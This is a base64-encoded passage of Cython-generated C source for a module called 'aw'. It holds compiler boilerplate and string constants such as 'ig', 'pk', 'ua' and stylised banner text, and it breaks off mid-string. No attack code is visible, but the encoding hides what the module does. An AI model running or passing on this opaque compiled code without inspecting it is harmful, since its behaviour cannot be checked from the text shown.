ICopOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBfX1B5eF9Jc1N1YnR5cGUoUHlfVFlQRShvYmopLCAoUHlUeXBlT2JqZWN0ICopdHlwZSkKI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgdHlwZTEsIHR5cGUyKSBfX1B5eF9Jc0FueVN1YnR5cGUyKFB5X1RZUEUob2JqKSwgKFB5VHlwZU9iamVjdCAqKXR5cGUxLCAoUHlUeXBlT2JqZWN0ICopdHlwZTIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc1N1YnR5cGUoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKnR5cGUxLCBQeU9iamVjdCAqdHlwZTIpOwojZWxzZQojZGVmaW5lIF9fUHl4X1R5cGVDaGVjayhvYmosIHR5cGUpIFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlKQojZGVmaW5lIF9fUHl4X1R5cGVDaGVjazIob2JqLCB0eXBlMSwgdHlwZTIpIChQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZTEpIHx8IFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlMikpCiNkZWZpbmUgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSkgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKnR5cGUxLCBQeU9iamVjdCAqdHlwZTIpIHsKICAgIHJldHVybiBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZTIpOwp9CiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMyKGVycjEsIGVycjIpICBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCksIGVycjEsIGVycjIpCiNkZWZpbmUgX19QeXhfUHlFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19FeGNlcHRpb24pCiNpZmRlZiBQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrCiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKG9iaikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIF9fUHl4X1R5cGVDaGVjayhvYmosIFB5RXhjX0Jhc2VFeGNlcHRpb24pCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkodm9pZCk7CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MoUHlPYmplY3QqIGZ1bmN0aW9uLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpOwoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jLCBpbnQgaXRlcm5leHQpOwoKCnN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3Q7CnR5cGVkZWYgUHlPYmplY3QgKigqX19weXhfY29yb3V0aW5lX2JvZHlfdCkoc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCAqLCBQeVRocmVhZFN0YXRlICosIFB5T2JqZWN0ICopOwojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwojZGVmaW5lIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgIF9QeUVycl9TdGFja0l0ZW0KI2Vsc2UKdHlwZWRlZiBzdHJ1Y3QgewogICAgUHlPYmplY3QgKmV4Y190eXBlOwogICAgUHlPYmplY3QgKmV4Y192YWx1ZTsKICAgIFB5T2JqZWN0ICpleGNfdHJhY2ViYWNrOwp9IF9fUHl4X0V4Y0luZm9TdHJ1Y3Q7CiNlbmRpZgp0eXBlZGVmIHN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3QgewogICAgUHlPYmplY3RfSEVBRAogICAgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5OwogICAgUHlPYmplY3QgKmNsb3N1cmU7CiAgICBfX1B5eF9FeGNJbmZvU3RydWN0IGdpX2V4Y19zdGF0ZTsKICAgIFB5T2JqZWN0ICpnaV93ZWFrcmVmbGlzdDsKICAgIFB5T2JqZWN0ICpjbGFzc29iajsKICAgIFB5T2JqZWN0ICp5aWVsZGZyb207CiAgICBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgeWllbGRmcm9tX2FtX3NlbmQ7CiAgICBQeU9iamVjdCAqZ2lfbmFtZTsKICAgIFB5T2JqZWN0ICpnaV9xdWFsbmFtZTsKICAgIFB5T2JqZWN0ICpnaV9tb2R1bGVuYW1lOwogICAgUHlPYmplY3QgKmdpX2NvZGU7CiAgICBQeU9iamVjdCAqZ2lfZnJhbWU7CiNpZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HICYmIChDWVRIT05fUFJPRklMRSB8fCBDWVRIT05fVFJBQ0UpCiAgICBQeU1vbml0b3JpbmdTdGF0ZSBfX3B5eF9weW1vbml0b3Jpbmdfc3RhdGVbX19QeXhfTW9uaXRvcmluZ0V2ZW50VHlwZXNfQ3lHZW5fY291bnRdOwogICAgdWludDY0X3QgX19weXhfcHltb25pdG9yaW5nX3ZlcnNpb247CiNlbmRpZgogICAgaW50IHJlc3VtZV9sYWJlbDsKICAgIGNoYXIgaXNfcnVubmluZzsKfSBfX3B5eF9Db3JvdXRpbmVPYmplY3Q7CnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3KAogICAgUHlUeXBlT2JqZWN0ICp0eXBlLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSwKICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7CnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdCgKICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihfX1B5eF9FeGNJbmZvU3RydWN0ICpzZWxmKTsKc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoUHlPYmplY3QgKnNlbGYpOwpzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXR2YWwpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUpOwpzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9DbG9zZShQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKipyZXR2YWwpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqYXJncyk7CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1N3YXBFeGNlcHRpb24oc2VsZikKI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihzZWxmKSAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSkKI2Vsc2UKI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfU3dhcEV4Y2VwdGlvbihzZWxmKSB7XAogICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrKTtcCiAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSk7XAogICAgfQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpIHtcCiAgICBfX1B5eF9FeGNlcHRpb25SZXNldCgoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSwgKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlLCAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrKTtcCiAgICAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1wKICAgIH0KI2VuZGlmCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9QeUdlbl9GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShwdmFsdWUpXAogICAgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKF9fcHl4X3RzdGF0ZSwgcHZhbHVlKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcCiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBwdmFsdWUpCiNlbmRpZgpzdGF0aWMgaW50IF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqcHZhbHVlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSk7CnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbik7CnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTsKc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTsKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpOwojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMgpzdGF0aWMgdm9pZCBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQoUHlUeXBlT2JqZWN0ICp0eXBlLCBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCAqc3RhdGljX2Ftc2VuZF9tZXRob2RzLCBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgYW1fc2VuZCk7CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZyk7CgoKI2RlZmluZSBfX1B5eF9HZW5lcmF0b3JfVVNFRAojZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KG9iaikgX19QeXhfSVNfVFlQRShvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0dlbmVyYXRvclR5cGUpCiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX05ldyhib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpXAogICAgX19QeXhfX0Nvcm91dGluZV9OZXcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSwgYm9keSwgY29kZSwgY2xvc3VyZSwgbmFtZSwgcXVhbG5hbWUsIG1vZHVsZV9uYW1lKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKTsKc3RhdGljIGludCBfX3B5eF9HZW5lcmF0b3JfaW5pdChQeU9iamVjdCAqbW9kdWxlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KFB5T2JqZWN0ICpzZWxmKTsKCgpzdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpOwoKCnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcik7CgoKI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUodm9pZCopOwpzdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZShQeU9iamVjdCogbW9kdWxlLCB2b2lkKik7CnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKHZvaWQqKTsKI2VsaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKI2RlZmluZSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlIFB5U3RhdGVfRmluZE1vZHVsZQojZGVmaW5lIF9fUHl4X1N0YXRlX0FkZE1vZHVsZSBQeVN0YXRlX0FkZE1vZHVsZQojZGVmaW5lIF9fUHl4X1N0YXRlX1JlbW92ZU1vZHVsZSBQeVN0YXRlX1JlbW92ZU1vZHVsZQojZW5kaWYKCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgICAgICNkZWZpbmUgX19QWVhfRkFTVENBTExfQUJJX1NVRkZJWCAgIl9mYXN0Y2FsbCIKICAgICNlbHNlCiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYCiAgICAjZW5kaWYKICAgICNkZWZpbmUgX19QWVhfTElNSVRFRF9BQklfU1VGRklYICJsaW1pdGVkIiBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWAojZWxzZQogICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX0FCSV9TVUZGSVgKI2VuZGlmCiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxCiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWAojZWxpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAiYW1zZW5kYmFja3BvcnQiCiNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAibm9hbXNlbmQiCiNlbmRpZgojaWZuZGVmIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWAogICAgI2RlZmluZSBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVgKI2VuZGlmCiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgICAjZGVmaW5lIF9fUFlYX1RQX0ZJTkFMSVpFX0FCSV9TVUZGSVgKI2Vsc2UKICAgICNkZWZpbmUgX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWCAibm9maW5hbGl6ZSIKI2VuZGlmCiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUyB8fCAhZGVmaW5lZChfX1B5eF9Bc3luY0dlbl9VU0VEKQogICAgI2RlZmluZSBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWAojZWxzZQogICAgI2RlZmluZSBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCAibm9mcmVlbGlzdHMiCiNlbmRpZgojZGVmaW5lIENZVEhPTl9BQkkgIF9fUFlYX0FCSV9WRVJTSU9OIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWCBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVggX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWCBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVgKI2RlZmluZSBfX1BZWF9BQklfTU9EVUxFX05BTUUgIl9jeXRob25fIiBDWVRIT05fQUJJCiNkZWZpbmUgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYIF9fUFlYX0FCSV9NT0RVTEVfTkFNRSAiLiIKCgoKCgojZGVmaW5lIF9fUHl4X01PRFVMRV9OQU1FICJhdyIKZXh0ZXJuIGludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl9hdzsKaW50IF9fcHl4X21vZHVsZV9pc19tYWluX2F3ID0gMDsKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX3ByaW50OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5faW5wdXQ7CnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9yYW5nZTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX29wZW47CgpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1tdID0gIiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMFtdID0gIjAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFbXSA9ICIxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa180W10gPSAiNCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQ1tdID0gIkMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1FbXSA9ICJcMjMwUSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfV1tdID0gIlciOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FbXSA9ICJhIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lW10gPSAiZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZltdID0gImYiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2tbXSA9ICJrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19uW10gPSAibiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcltdID0gInIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3dbXSA9ICJ3IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19HTltdID0gIkdOIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19JRFtdID0gIklEIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19UTFtdID0gIlRMIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMltdID0gIlwzNjBcMjM1XDIyN1wyMzNcMzYwXDIzNVwyMjdcMjM0XDM2MFwyMzVcMjI3XDI0N1wzNjBcMjM1XDIyN1wyNDYgLSBbIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fM1tdID0gIl0gICAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX180W10gPSAiXDM2MFwyMzVcMjI3XDIyNVwzNjBcMjM1XDIyN1wyMjRcMzYwXDIzNVwyMjdcMjI3IC0gWyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzVbXSA9ICJcMzYwXDIzNVwyMjdcMjI1XDM2MFwyMzVcMjI3XDIyNFwzNjBcMjM1XDIyN1wyMjcgXDM2MFwyMzVcMjI3XDI0MFwzNjBcMjM1XDIyN1wyMjRcMzYwXDIzNVwyMjdcMjM0XDM2MFwyMzVcMjI3XDIzNyAtIFsiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX182W10gPSAiXSAgICAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX183W10gPSAiXHIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX184W10gPSAiKiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzlbXSA9ICJbXCIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2F3W10gPSAiYXciOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2djW10gPSAiZ2MiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2dyW10gPSAiZ3IiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lkW10gPSAiaWQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lnW10gPSAiaWciOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX24xW10gPSAibjEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX24yW10gPSAibjIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX29zW10gPSAib3MiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3BrW10gPSAicGsiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3BwW10gPSAicHAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JlW10gPSAicmUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RsW10gPSAidGwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3VhW10gPSAidWEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFfMltdID0gIlwyMzAxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18zNTZbXSA9ICIzNTYiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0RldltdID0gIlwzNDJcMjU1XDIyMCBEZXYiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1JFRFtdID0gIlJFRCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfU2V4W10gPSAiU2V4IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19YeHhbXSA9ICJYeHgiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18xMFtdID0gIlwiLFwiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTFbXSA9ICJcIiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzEyW10gPSAiLy8iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18xM1tdID0gIlxuIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTRbXSA9ICJAIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTVbXSA9ICJcIn0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18xNltdID0gIlxuXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXDM0MlwyNzBcMjczXG5cMzQyXDIzMlwyNDEgXDM2MFwyMzVcMjIwXDIxMFwzNjBcMjM1XDIyMFwyMTVcMzYwXDIzNVwyMjBcMjIyXDM2MFwyMzVcMjIwXDIyM1wzNjBcMjM1XDIyMFwyMDAgXDM2MFwyMzVcMjIwXDIxN1wzNjBcMjM1XDIyMFwyMjFcMzYwXDIzNVwyMjBcMjE2XDM2MFwyMzVcMjIwXDIwNVwzNjBcMjM1XDIyMFwyMTBcMzYwXDIzNVwyMjBcMjEzXDM2MFwyMzVcMjIwXDIwNCBcMzQyXDIzMlwyNDFcblwzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1wzNDJcMjcwXDI3M1xuXG5cMzYwXDIzN1wyMjFcMjQ0IFwzNjBcMjM1XDIyNVwyMTRcMzYwXDIzNVwyMjVcMjEyXDM2MFwyMzVcMjI0XDI3NFwzNDJcMjA0XDIzNSA6IEAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18xN1tdID0gIlxuXDM2MFwyMzdcMjIzXDI0NyBcMzYwXDIzNVwyMjRcMjc0XDM2MFwyMzVcMjI1XDIwNFwzNjBcMjM1XDIyNFwyNzBcMzYwXDIzNVwyMjVcMjAwXDM2MFwyMzVcMjI1XDIwMyA6ICI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzE4W10gPSAiXG5cMzYwXDIzN1wyMjFcMjQ1IFwzNjBcMjM1XDIyNFwyNzVcMzYwXDIzNVwyMjVcMjA2XDM2MFwyMzVcMjI1XDIwM1wzNjBcMjM1XDIyNVwyMDNcMzYwXDIzNVwyMjVcMjA2XDM2MFwyMzVcMjI1XDIxNlwzNjBcMjM1XDIyNFwyNzRcMzQyXDIwNFwyMzVcMzYwXDIzNVwyMjVcMjEyIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTlbXSA9ICJcblwzNjBcMjM3XDIxN1wyMDMgXDM2MFwyMzVcMjI0XDI3NVwzNjBcMjM1XDIyNVwyMDZcMzYwXDIzNVwyMjVcMjAzXDM2MFwyMzVcMjI1XDIwM1wzNjBcMjM1XDIyNVwyMDZcMzYwXDIzNVwyMjVcMjE2XDM2MFwyMzVcMjI1XDIw